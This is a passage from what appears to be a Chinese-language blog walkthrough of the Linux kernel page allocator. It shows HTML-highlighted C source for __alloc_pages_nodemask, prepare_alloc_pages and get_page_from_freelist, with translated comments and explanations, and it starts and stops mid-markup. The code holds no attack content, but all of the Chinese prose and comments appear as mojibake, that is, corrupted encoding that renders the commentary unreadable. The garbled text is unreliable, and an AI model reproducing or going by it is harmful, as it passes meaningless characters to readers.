class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is the &#x27;heart&#x27; of the zoned buddy allocator.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_nodemask</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">preferred_nid</span>,</span><br><span class="hljs-class"><span class="hljs-title">nodemask_t</span> *<span class="hljs-title">nodemask</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags = ALLOC_WMARK_LOW;<br><span class="hljs-type">gfp_t</span> alloc_mask; <span class="hljs-comment">/* å®é™…ç”¨äºåˆ†é…çš„ gfp_t ï¼Œè¿™æ˜¯ä¸€ä¸ªintç±»å‹çš„æ•´å‹*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> <span class="hljs-title">ac</span> =</span> &#123; &#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬å‡å®š order çš„å€¼åœ¨ä¸€äº›åœ°æ–¹æ˜¯æ­£å¸¸çš„ï¼Œ</span><br><span class="hljs-comment"> * å› æ­¤è‹¥è¯·æ±‚è¶…å‡ºèŒƒå›´åˆ™æå‰é€€å‡º</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;<br>WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>gfp_mask &amp;= gfp_allowed_mask;<br>alloc_mask = gfp_mask;<br><span class="hljs-keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç›´åˆ°æ‰€æœ‰çš„ local zone éƒ½è¢«è€ƒè™‘ä¹‹å‰ï¼Œ</span><br><span class="hljs-comment"> * ç¦æ­¢ä» falling back åˆ°å†…å­˜ç¢ç‰‡ç§ç±»çš„ç¬¬ä¸€æ¬¡ä¼ é€’</span><br><span class="hljs-comment"> */</span><br>alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);<br><br><span class="hljs-comment">/* ç¬¬ä¸€æ¬¡åˆ†é…å°è¯• */</span><br>page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);<br><span class="hljs-keyword">if</span> (likely(page))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åº”ç”¨ä½œç”¨åŸŸåˆ†é…çº¦æŸ è¿™ä¸»è¦ä¸ GFP_NOFS æœ‰å…³ã€‚</span><br><span class="hljs-comment"> * GFP_NOIO å¿…é¡»ä»ä¸€ä¸ªç‰¹å®šçš„ç”± memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;</span><br><span class="hljs-comment"> * æ‰€æ ‡è®°çš„ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰çš„åˆ†é…è¯·æ±‚ä¸­ç»§æ‰¿</span><br><span class="hljs-comment"> */</span><br>alloc_mask = current_gfp_context(gfp_mask);<br>ac.spread_dirty_pages = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ¢å¤æœ€åˆçš„ nodemask ï¼ˆå…¶å¯èƒ½è¢«æ›¿æ¢ä¸º &amp;cpuset_current_mems_allowed</span><br><span class="hljs-comment"> * ä»¥ä¼˜åŒ–å¿«é€Ÿï¼ˆåˆ†é…ï¼‰è·¯å¾„çš„å°è¯•ï¼‰</span><br><span class="hljs-comment"> */</span><br>ac.nodemask = nodemask;<br><br>page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);<br><br>out:<br><span class="hljs-keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;<br>    unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="hljs-number">0</span>)) &#123;<br>__free_pages(page, order);<br>page = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br>EXPORT_SYMBOL(__alloc_pages_nodemask);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„å…·ä½“æ­¥éª¤ä¸»è¦åˆ†ä¸ºä¸‰æ­¥ï¼š</p><ul><li>æ£€æŸ¥å‚æ•°åˆæ³•æ€§ï¼Œå¹¶åšåˆ†é…å‰å‡†å¤‡å·¥ä½œ</li><li>è¿›è¡Œ<strong>å¿«é€Ÿåˆ†é…</strong>ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›ç»“æœ</li><li>è‹¥å¿«é€Ÿåˆ†é…å¤±è´¥ï¼Œåˆ™è¿›è¡Œ<strong>æ…¢é€Ÿåˆ†é…</strong></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ·±å…¥å¿«é€Ÿåˆ†é…ä¸æ…¢é€Ÿåˆ†é…çš„å†…éƒ¨ç»†èŠ‚</p><h3 id="I-prepare-alloc-pages-ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ">I. prepare_alloc_pages()ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ</h3><p>è¿™ä¸ªå‡½æ•°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯åšåˆ†é…å‰çš„ä¸€äº›å‡†å¤‡çš„å·¥ä½œï¼ŒåŒ…æ‹¬åˆå§‹åŒ– <code>alloc_context</code> ç»“æ„ä½“ã€è·å– zone æ•°ç»„ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">prepare_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">int</span> preferred_nid, <span class="hljs-type">nodemask_t</span> *nodemask,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> alloc_context *ac, <span class="hljs-type">gfp_t</span> *alloc_mask,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *alloc_flags)</span><br>&#123;<br>ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);<br>ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask); <span class="hljs-comment">// è·å– zonelist</span><br>ac-&gt;nodemask = nodemask;<br>ac-&gt;migratetype = gfp_migratetype(gfp_mask);<br><br>    <span class="hljs-comment">// è‹¥å¼€å¯äº† cpusetï¼ˆé™åˆ¶æŸä¸€ç»„è¿›ç¨‹åªè¿è¡Œåœ¨æŸäº›cpuå’Œå†…å­˜èŠ‚ç‚¹ä¸Šï¼‰ï¼Œåˆ™è®¾ç½®å¯¹åº”çš„æ ‡å¿—ä½ã€‚</span><br><span class="hljs-keyword">if</span> (cpusets_enabled()) &#123;<br>*alloc_mask |= __GFP_HARDWALL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ä¸­æ–­ä¸Šä¸‹æ–‡ä¸­, åˆ™è¿™ä¸å½“å‰è¿›ç¨‹ä¸Šä¸‹æ–‡æ— å…³ã€‚</span><br><span class="hljs-comment"> * è¿™æ„å‘³ç€ä»»ä¸€ node éƒ½æ˜¯ ok çš„.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)<br>ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;<br><span class="hljs-keyword">else</span><br>*alloc_flags |= ALLOC_CPUSET;<br>&#125;<br><br>fs_reclaim_acquire(gfp_mask);<br>fs_reclaim_release(gfp_mask);<br><br>might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);<br><br><span class="hljs-keyword">if</span> (should_fail_alloc_page(gfp_mask, order))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);<br><br><span class="hljs-comment">/* Dirty zone çš„å¹³è¡¡ä»…åœ¨ fast path ä¸­å®Œæˆ */</span><br>ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * preferred zone è¢«ç”¨äºè¿›è¡Œæ•°æ®ç»Ÿè®¡ï¼Œ ä½†éå¸¸é‡è¦çš„æ˜¯å…¶é¡µè¢«ç”¨ä½œ</span><br><span class="hljs-comment"> * zonelist è¿­ä»£å™¨çš„èµ·å§‹ç‚¹. å¯¹äºå¿½ç•¥å†…å­˜ç­–ç•¥çš„åˆ†é…ï¼Œå…¶å¯èƒ½ä¼šè¢«é‡ç½®ã€‚</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>é¦–å…ˆè°ƒç”¨ <code>node_zonelist()</code> ä» <code>preferred_nid</code> å‚æ•°æ‰€æŒ‡å®šçš„ node ä¸­è·å–ä¸€ä¸ª zonelistï¼Œå…¶å®å°±æ˜¯å– <code>pglist_data-&gt;node_zonelists[gfp_zonelist(flags)]</code></li><li>è¿›è¡Œ cpuset ç›¸å…³åˆ¤æ–­ä¸æ ‡å¿—ä½è®¾ç½®ï¼Œè‹¥æ˜¯åœ¨ä¸­æ–­ä¸Šä¸‹æ–‡åˆ™ç›´æ¥å°† nodemask è®¾ä¸º <code>cpuset_current_mems_allowed</code></li><li>æœ€åè°ƒç”¨ <code>first_zones_zonelist()</code> è®¾ç½® preferred zoneï¼Œå¤§æ¦‚æ˜¯åœ¨ zonelist ä¸­â†’nodemask æ‰€åŒ…å«çš„ zone ä¸­â†’ <code>highest_zoneidx</code> ä»¥ä¸‹çš„ç¬¬ä¸€ä¸ª zone</li></ul><blockquote><p>åæ­£æºç æ³¨é‡Šæ˜¯è¿™ä¹ˆå†™çš„hhh</p></blockquote><h3 id="II-get-page-from-freelist-ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰">II. get_page_from_freelist()ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰</h3><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦æ˜¯éå†åˆ†é…ä¸Šä¸‹æ–‡å¯¹åº”çš„ zonelist ä¸­çš„ zone è¿›è¡Œå†…å­˜åˆ†é…ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_page_from_freelist éå† zonelist å°è¯•åˆ†é…é¡µé¢</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<br><span class="hljs-title function_">get_page_from_freelist</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order, <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> alloc_context *ac)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">z</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">last_pgdat_dirty_limit</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> no_fallback;<br><br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ‰«æ zonelist, å¯»æ‰¾æœ‰ç€è¶³å¤Ÿç©ºé—²é¡µé¢çš„ zone.</span><br><span class="hljs-comment"> * å‚è§ __cpuset_node_allowed() çš„æ³¨é‡Šï¼ˆkernel/cpuset.cï¼‰</span><br><span class="hljs-comment"> */</span><br>no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT; <span class="hljs-comment">// é¿å…å†…å­˜ç¢ç‰‡çš„flag</span><br>z = ac-&gt;preferred_zoneref; <span class="hljs-comment">// å…ˆå°è¯•ä» preferred zone ä¸­åˆ†é…</span><br>    <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªå°è£…å®ï¼Œè¡¨ç¤ºä» z å¼€å§‹éå† zonelist ä¸­çš„ zoneref æ•°ç»„ï¼Œ</span><br>    <span class="hljs-comment">// å…¶æ ¸å¿ƒæ˜¯å•æ¬¡è¿­ä»£è°ƒç”¨ next_zones_zonelist()ï¼Œè¯¥å‡½æ•°è¿”å›:</span><br>    <span class="hljs-comment">// åœ¨ nodemask çš„ zone ä¸­ï¼Œä»¥å½“å‰ zone ä½œä¸ºèµ·ç‚¹æ¸¸æ ‡çš„</span><br>    <span class="hljs-comment">// ã€ä½äºæˆ–ä½äºã€‘highest_zoneidx çš„ä¸‹ä¸€ä¸ª zone</span><br>for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,<br>ac-&gt;nodemask) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mark;<br><br>        <span class="hljs-comment">// å¼€å¯äº† cpuset ä¸” flag ä¸­æœ‰ ALLOC_CPUSET æ ‡å¿—ä½ï¼Œ</span><br>        <span class="hljs-comment">// ä½†æ˜¯ cpuset ä¸­ä¸å…è®¸ä»¥è¯¥ gfp_mask åœ¨è¯¥ zone ä¸­åˆ†é…ï¼Œ</span><br>        <span class="hljs-comment">// è¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£</span><br><span class="hljs-keyword">if</span> (cpusets_enabled() &amp;&amp;<br>(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;<br>!__cpuset_zone_allowed(zone, gfp_mask))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åœ¨åˆ†é…é¡µç¼“å­˜ï¼ˆpage cacheï¼‰é¡µä»¥è¿›è¡Œå†™å…¥æ—¶, æˆ‘ä»¬æƒ³è¦</span><br><span class="hljs-comment"> * åœ¨ä¸€ä¸ªèŠ‚ç‚¹çš„â€œè„é™åˆ¶â€ï¼ˆdirty limitï¼‰å†…è·å¾—ä»–, </span><br><span class="hljs-comment">         * ç”±æ­¤ï¼Œæ²¡æœ‰ä¸€ä¸ªèŠ‚ç‚¹æœ‰ç€è¶…è¿‡å…¨å±€å…è®¸çš„è„é¡µæ¯”ä¾‹ã€‚</span><br><span class="hljs-comment"> * è„é™åˆ¶è€ƒè™‘äº†èŠ‚ç‚¹çš„ä½ç«¯å†…å­˜ä¿ç•™å’Œé«˜æ°´ä½çº¿ï¼Œ</span><br><span class="hljs-comment"> * ä»¥ä¾¿äº kswapd èƒ½å¹³è¡¡å®ƒï¼Œè€Œä¸å¿…ä»å…¶ LRU åˆ—è¡¨ä¸­å†™å…¥é¡µé¢ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">XXX:</span> ç°åœ¨, åœ¨è¿›å…¥å›æ”¶ä¹‹å‰ï¼Œ</span><br><span class="hljs-comment"> * å…è®¸åˆ†é…å¯èƒ½è¶…è¿‡ æ…¢é€Ÿè·¯å¾„ä¸­ (spread_dirty_pages unset)</span><br><span class="hljs-comment"> * å•èŠ‚ç‚¹çš„ dirty limitï¼Œè¿™åœ¨ä¸€ä¸ªå…è®¸èŠ‚ç‚¹ä»¬åœ¨ä¸€èµ·éƒ½æœªå¤Ÿå¤§ä»¥è¾¾åˆ°å…¨å±€é™åˆ¶</span><br><span class="hljs-comment">         * çš„ NUMA è®¾ç½®ä¸­æ˜¯å¾ˆé‡è¦çš„ã€‚å¯¹äºè¿™äº›æƒ…å†µçš„åˆé€‚çš„ä¿®è¡¥å°†éœ€è¦å¯¹</span><br><span class="hljs-comment"> * dirty-throttling ä¸ flusher threads ä¸­èŠ‚ç‚¹çš„æ„è¯†.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// è¯‘æ³¨ï¼šåŸæ–‡å°±æ˜¯XXXï¼Œç¬”è€…ä¹Ÿä¸çŸ¥é“è¿™ä¸ªXXXæ˜¯ä»€ä¹ˆ...</span><br>        <span class="hljs-comment">// å¤§æ¦‚å°±æ˜¯æ£€æŸ¥å½“å‰zoneå¯¹åº”nodeçš„è„é¡µæ•°é‡æ˜¯ä¸æ˜¯è¾¾åˆ°é™åˆ¶äº†</span><br><span class="hljs-keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;<br><span class="hljs-keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;<br>last_pgdat_dirty_limit = zone-&gt;zone_pgdat;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// node æ•°é‡å¤§äº1ï¼Œä¸”å½“å‰ zone å¹¶é preferred zone</span><br><span class="hljs-keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="hljs-number">1</span> &amp;&amp;<br>    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;<br><span class="hljs-type">int</span> local_nid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ç§»åŠ¨åˆ°äº† remote nodeï¼ˆè¯‘æ³¨ï¼šéå½“å‰nodeï¼Ÿï¼‰, åˆ™é‡è¯•ï¼Œ</span><br><span class="hljs-comment"> * ä½†å…è®¸ fragmenting fallbacks. å±€éƒ¨æ€§æ¯”é¿å…ç¢ç‰‡æ›´åŠ é‡è¦ã€‚</span><br><span class="hljs-comment"> */</span><br>            <span class="hljs-comment">// æ¯”å¯¹å½“å‰ zone æ˜¯å¦åœ¨ local nodeï¼ˆå°±æ˜¯ç¦»å½“å‰CPUæœ€è¿‘é‚£ä¸ª nodeï¼‰</span><br>            <span class="hljs-comment">// è‹¥å¦ï¼Œåˆ™å»æ‰ ALLOC_NOFRAGMENT æ ‡å¿—ä½ï¼Œå¹¶ä» preferred zone å¼€å§‹é‡è¯•ã€‚</span><br>            <span class="hljs-comment">// å³ï¼škernel æ›´å€¾å‘äºä¼˜å…ˆä» local zone è¿›è¡Œåˆ†é…ï¼Œå“ªæ€•ä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡</span><br>local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);<br><span class="hljs-keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// è·å–å½“å‰ zone çš„æ°´ä½çº¿æ ‡è®°</span><br>mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);<br><span class="hljs-keyword">if</span> (!zone_watermark_fast(zone, order, mark,<br>       ac-&gt;highest_zoneidx, alloc_flags,<br>       gfp_mask)) &#123; <span class="hljs-comment">// æ°´ä½çº¿ç›¸å…³æ“ä½œ</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¯¥ zone çš„æ°´ä½çº¿å¤±è´¥, ä½†è‹¥å…¶åŒ…å«äº† deferred pagesï¼Œ</span><br><span class="hljs-comment"> * åˆ™æˆ‘ä»¬ä¼šçœ‹è¯¥ zone æ˜¯å¦è¿˜èƒ½å†è¿›è¡Œæ‰©å±•</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* Checked here to keep the fast path fast */</span><br>BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);<br>            <span class="hljs-comment">// è¯¥æ ‡å¿—ä½æ„ä¸ºã€ä¸æ£€æŸ¥æ°´ä½çº¿ã€‘ï¼Œæ­¤æ—¶æˆ‘ä»¬ç›´æ¥å°è¯•ä»è¯¥ zone ä¸­åˆ†é…</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">if</span> (node_reclaim_mode == <span class="hljs-number">0</span> ||<br>    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))<br><span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// é¦–å…ˆè¿›è¡Œé¡µé¢å›æ”¶ï¼Œä¹‹åæŸ¥çœ‹æ˜¯å¦æ»¡è¶³æ°´ä½çº¿è¦æ±‚ï¼Œè‹¥â€˜</span><br>            <span class="hljs-comment">// ä¸æ‰«æ/æ²¡æœ‰å¯å›æ”¶/æ£€æŸ¥æœªé€šè¿‡</span><br>            <span class="hljs-comment">// åˆ™éƒ½ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£ï¼Œå°è¯•ä¸‹ä¸€ä¸ª zone</span><br>ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_NOSCAN:<br><span class="hljs-comment">/* ä¸æ‰«æ */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_FULL:<br><span class="hljs-comment">/* æ‰«æäº†ä½†ä¸å¯å›æ”¶ */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">/* æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å›æ”¶äº†è¶³å¤Ÿé¡µé¢ */</span><br><span class="hljs-keyword">if</span> (zone_watermark_ok(zone, order, mark,<br>ac-&gt;highest_zoneidx, alloc_flags))<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>try_this_zone:<br>        <span class="hljs-comment">// æ¥åˆ°è¯¥ label 